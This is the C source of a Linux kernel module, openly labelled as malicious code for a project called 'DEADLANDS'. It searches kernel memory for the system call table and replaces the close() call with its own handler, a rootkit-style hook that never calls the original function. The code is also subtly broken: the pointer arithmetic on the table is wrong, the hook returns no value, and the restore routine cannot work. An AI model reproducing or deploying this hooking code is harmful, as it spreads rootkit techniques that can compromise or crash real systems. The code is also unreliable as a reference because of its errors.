/*
** hookSYS.c for ** MALICIOUS CODE: PROJECT - DEADLANDS **
** 
** Made by majdi
** Login   <majdi.toumi@gmail.com>
** 
*/

#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/sched.h>

#include "hookSYS.h"

/*
** ~ INFORMATIONS:
*/
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("[ EpiTek4 ] Strasbourg");

/*
** ~ Initializations:
*/
static unsigned long	**syscall_table = NULL;
static unsigned long	save_syscall;

static int	hookSYS_init(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - module init\n");

  syscall_table = get_syscall_table();
  if (syscall_table == NULL)
    {
      printk(KERN_ALERT "[MSG] deadlands h00k SYS - can't grab syscall table\n");
      return -1;
    }
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - grab syscall table @ 0x%p\n", syscall_table);

  save_syscall=*(long(*))(syscall_table+__NR_close*sizeof(void*));
  printk("close located at => 0x%p \n",&save_syscall);

  *(long(*))(syscall_table+__NR_close*sizeof(void*))=&my_sys_close;

  //epiHook(nSYSCALL, &save_syscall, &my_handler);
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - syscall powned!\n");
  return (0);
}

static void	hookSYS_exit(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - module exit\n");
  epiHook(nSYSCALL, &my_sys_close, &save_syscall);
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - syscall restored!\n");
}

/*
** ~ Functions:
*/
unsigned long	**get_syscall_table(void)
{
  unsigned long	**systable;
  unsigned long	*tmp;
  unsigned long	ptr;
  unsigned long	beg;
  unsigned long	end;

  systable = NULL;
/*   beg = (unsigned long)&loops_per_jiffy; */
/*   end = (unsigned long)&boot_cpu_data; */
  beg = (unsigned long)((init_mm.end_code + 4) & 0xFFFFFFFC);
  end = (unsigned long)init_mm.end_data;

  for (ptr = beg; ptr < end; ptr++)
    {
      tmp = (unsigned long *)ptr;
      if (tmp[__NR_close] == (unsigned long)sys_close)
	{
	  systable = (unsigned long **)&tmp[0];
	  return (systable);
	}
    }
  return (NULL);
}

void		epiHook(int nSYS, void *old_syscall, void *new_syscall)
{
  //unsigned long	*ptr;

  //ptr = (unsigned long *)(syscall_table + nSYS * sizeof(void *));
  old_syscall = (unsigned long *)(syscall_table + nSYS * sizeof(void *));;
  syscall_table[nSYS * sizeof(void *)] = new_syscall;
}

unsigned long	my_sys_close(unsigned int fd)
{
  my_handler();
}

void		my_handler(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k SYS - CALLING SYSCALL^^\n");
}

/*
** ~ Let's Rock!
*/
module_init(hookSYS_init);
module_exit(hookSYS_exit);
